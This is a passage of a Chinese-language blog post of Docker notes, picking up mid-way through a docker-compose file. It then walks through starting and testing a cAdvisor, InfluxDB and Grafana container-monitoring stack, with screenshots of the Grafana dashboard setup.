<p>  - /sys:/sys:ro</p>
<p>  - /var/lib/docker/:/var/lib/docker:ro</p>
<p> grafana:</p>
<p> user: “104”</p>
<p> image: grafana/grafana</p>
<p> user: “104”</p>
<p> restart: always</p>
<p> links:</p>
<p>  - influxdb:influxsrv</p>
<p> ports:</p>
<p>  - “3000:3000”</p>
<p> volumes:</p>
<p>  - grafana_data:/var/lib/grafana</p>
<p> environment:</p>
<p>  - HTTP_USER=admin</p>
<p>  - HTTP_PASS=admin</p>
<p>  - INFLUXDB_HOST=influxsrv</p>
<p>  - INFLUXDB_PORT=8086</p>
<p>  - INFLUXDB_NAME=cadvisor</p>
<p>  - INFLUXDB_USER=root</p>
<p>  - INFLUXDB_PASS=root</p>
<h3 id="3-3-启动docker-compose文件"><a href="#3-3-启动docker-compose文件" class="headerlink" title="3.3 启动docker-compose文件"></a>3.3 启动docker-compose文件</h3><p>docker-compose up</p>
<p><img src="/2022/02/07/Docker/E5386A5F-8A80-408A-B439-FCB0C411C96C.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/F31C878A-BF1C-44C9-BBD2-9E4D7CF08E3C.png" alt="img"></p>
<h3 id="3-4-查看三个服务容器是否启动"><a href="#3-4-查看三个服务容器是否启动" class="headerlink" title="3.4 查看三个服务容器是否启动"></a>3.4 查看三个服务容器是否启动</h3><p><img src="/2022/02/07/Docker/image-20220216144945621.png" alt="image-20220216144945621"></p>
<h3 id="3-5-测试"><a href="#3-5-测试" class="headerlink" title="3.5 测试"></a>3.5 测试</h3><h4 id="1、浏览cAdvisor收集服务，http-ip-8080"><a href="#1、浏览cAdvisor收集服务，http-ip-8080" class="headerlink" title="1、浏览cAdvisor收集服务，http://ip:8080/"></a>1、浏览cAdvisor收集服务，<a target="_blank" rel="noopener" href="http://ip:8080/">http://ip:8080/</a></h4><p>第一次访问慢，请稍等</p>
<p>cadvisor也有基础的图形展现功能，这里主要用它来作数据采集</p>
<p><img src="/2022/02/07/Docker/image-20220216163856900.png" alt="image-20220216163856900"></p>
<h4 id="2、浏览influxdb存储服务，http-ip-8083"><a href="#2、浏览influxdb存储服务，http-ip-8083" class="headerlink" title="2、浏览influxdb存储服务，http://ip:8083/"></a>2、浏览influxdb存储服务，<a target="_blank" rel="noopener" href="http://ip:8083/">http://ip:8083/</a></h4><h4 id="3、浏览grafana展现服务，http-ip-3000"><a href="#3、浏览grafana展现服务，http-ip-3000" class="headerlink" title="3、浏览grafana展现服务，http://ip:3000"></a>3、浏览grafana展现服务，<a target="_blank" rel="noopener" href="http://ip:3000/">http://ip:3000</a></h4><p>(1)ip+3000端口的方式访问,默认帐户密码（admin/admin）</p>
<p><img src="/2022/02/07/Docker/629D8A49-F954-4FD4-AD46-8AA25F726A4C.png" alt="img"></p>
<p>(2)配置步骤</p>
<p>/1:配置数据源</p>
<p><img src="/2022/02/07/Docker/image-20220216145249317.png" alt="image-20220216145249317"></p>
<p>/2:选择influxdb数据源</p>
<p><img src="/2022/02/07/Docker/A995CCE9-D9D6-49DB-9888-183639FDD187.png" alt="img"></p>
<p>/3:配置细节</p>
<p><img src="/2022/02/07/Docker/55F3DD00-50CB-4B9B-B400-EDDDBF5CB54D.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/image-20220216145422117.png" alt="image-20220216145422117"></p>
<p>/4: 配置面板panel</p>
<p><img src="/2022/02/07/Docker/3F48E847-3ABE-475D-B218-AEE1AEEFD35D.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/1E82A732-8C99-4BCB-B2A4-EFC79FDFF944.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/9508B36C-C4ED-48D3-A5C2-C0646BED706C.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/B8030C0F-FB03-42BD-9D5E-1820CC7A32D0.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/CA6B1ED1-D6C3-4EAF-92CA-DBF979892C39.png" alt="img"></p>
<p><img src="/2022/02/07/Docker/2B8AFDAE-73D4-410E-BF77-FE1E93166B9A.png" alt="img"></p>
<p>到这里cAdvisor+InfluxDB+Grafana容器监控系统就部署完成了</p>
<h1 id="终章の总结"><a href="#终章の总结" class="headerlink" title="终章の总结"></a>终章の总结</h1><p>知识回顾简单串讲和总结</p>
<p><img src="/2022/02/07/Docker/DD3BA8F3-6209-42CB-A755-20A672AEA05E.png" alt="img"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>

</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">


<div class="copyright">
  &copy; 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">CJ</span>
</div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Symbols count total">492k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">7:28</span>
  </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>

  





  





</body>
</html>
